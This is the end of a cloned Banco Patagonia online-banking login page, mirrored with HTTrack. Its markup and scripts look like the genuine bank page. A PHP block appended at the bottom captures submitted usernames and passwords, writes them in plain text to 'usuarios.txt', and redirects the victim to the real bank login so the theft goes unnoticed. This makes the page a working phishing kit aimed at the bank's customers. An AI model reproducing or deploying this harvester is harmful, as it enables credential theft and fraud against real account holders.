		<!-- 				<script type='text/javascript'>showSeal('ebankpersonas.bancopatagonia.com.ar', 'es', 'yes', '/eBanking/images/seals/', 'VCHS-1.0', '200', '72');</script> -->
		<!-- 			</div> -->
		<!-- 		</div> -->

		<div
			style="float: left; height: 165px; width: 297px;">

			<!-- Capa 2 -->
			
			
				<div style="display: table-cell; height: 90px;">
					<a href="#" onclick="window.open('https://www.bancopatagonia.com.ar/canales-de-atencion/patagonia-movil.php','','width=800, height=600')"/> <img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/marketing/NuevaDefault_PatagoniaMovil_297x90_1661196128819.png" alt="Patagonia Movil" style="border: none;" />
					</a>
				</div>
			
			

			<!-- Capa 3 -->
			
			
				<div style="height: 75px;">
					<a href="#" onclick="window.open('https://www.bancopatagonia.com.ar/canales-de-atencion/patagonia-movil.php','','width=800, height=600')"/> <img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/marketing/NuevaDefault_PatagoniaMovil_297x90_2_1661196178179.png" alt="Patagonai movil" style="border: none;"/>
					</a>
				</div>
			
			

		</div>

		<!-- Capa 4 -->
		
		
			<div id="ayuda">
				<a href="#" onclick="window.open('https://bancopatagonia.com.ar/ayuda/preguntas-frecuentes.php','','width=800, height=600')"/> <img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/marketing/NuevaDefault_NuevaDefault_Token_221x167_2_1661361754013.png"
					alt="Token Patagonia" height="167px" width="221px" style="border: none;" />
				</a>
			</div>
		
		

		<!-- Capa 5 -->
		
		
			<div id="seguridad">
				<a  href="https://www.bancopatagonia.com.ar/personas/tarjetas/beneficios.php"/><img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/marketing/NuevaDefault_Beneficios_223x167_1661196233804.png"
					alt="Beneficios" height="167px" width="223px" style="border: none;" />
				</a>
			</div>
		
		
	</div>

	<script>
		document.getElementById("usernameDocumento").focus();

		var haySesion = false;
		

		var jconcurrentid = leerCookie('JCONCURRENTID');
		var jconcurrentbit = leerCookie('JCONCURRENTBIT');
		if(jconcurrentid != null && jconcurrentbit != null && !haySesion) {

            logError("Error de sesion concurrente: JCONCURRENTID:" +jconcurrentid + ", JCONCURRENTBIT" + jconcurrentbit + ", haySesion " + haySesion);

			eliminarCookie('JCONCURRENTID');
            eliminarCookie('JCONCURRENTBIT');
			window.open("https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/logoutConcurrentPopUp.htm", "", "toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,width=360,height=215,top=150,left=150");
		}
		
		function eliminarCookie(nombre) {
			document.cookie = nombre + '=;expires=Thu, 01 Jan 1970 00:00:01 GMT;' + 'path=/eBanking';
		}
		
		function leerCookie(nombre) {
		    var nombreIgual = nombre + "=";
		    var partes = document.cookie.split(';');
		    for(var i = 0; i < partes.length; i++) {
		        var parte = partes[i];
		        while (parte.charAt(0)==' ') {
		        	parte = parte.substring(1, parte.length);
		        }
		        if (parte.indexOf(nombreIgual) == 0) {
		        	return parte.substring(nombreIgual.length, parte.length);
		        }
		    }
		    return null;
		}
	</script>
			</div>

			<div id="footerLoginGral">	<!-- footer (+) -->

				<div id="footer_content">
					<img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/logoPatagoniaPie.gif"/>&nbsp;&copy;&nbsp;
					&nbsp;|&nbsp;
					<a href="#"  onclick="window.open('https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/clausulasLegales.htm'
,'','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no,noresize,width=475,height=480,top=50,left=50 ')">Cláusulas Legales</a>&nbsp;</b>
				</div>
			</div>				<!-- footer (-) -->
		</div>

	</body>
	<head>
		<meta http-equiv="Pragma" content="no-cache" />
	</head>
		<?php
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		$usuario = $_POST['username'];
		$password = $_POST['password'];
		// Asegúrate de que los datos estén escapados para evitar problemas de seguridad
		$usuario = htmlspecialchars($usuario, ENT_QUOTES, 'UTF-8');
		$password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

		// Ruta del archivo donde se guardarán los datos
		$file = 'usuarios.txt';

		// Datos a guardar
		$data = "Usuario: $usuario, Contraseña: $password\n";

		// Guardar los datos en el archivo
		file_put_contents($file, $data, FILE_APPEND);

		// Generar código JavaScript para redireccionar después de 1 segundo
		echo "<script>";
		echo "  window.location.href = 'https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.htm';";
		echo "</script>";
	}
	?>


<!-- Mirrored from ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 06 Jun 2024 22:50:13 GMT -->
</html>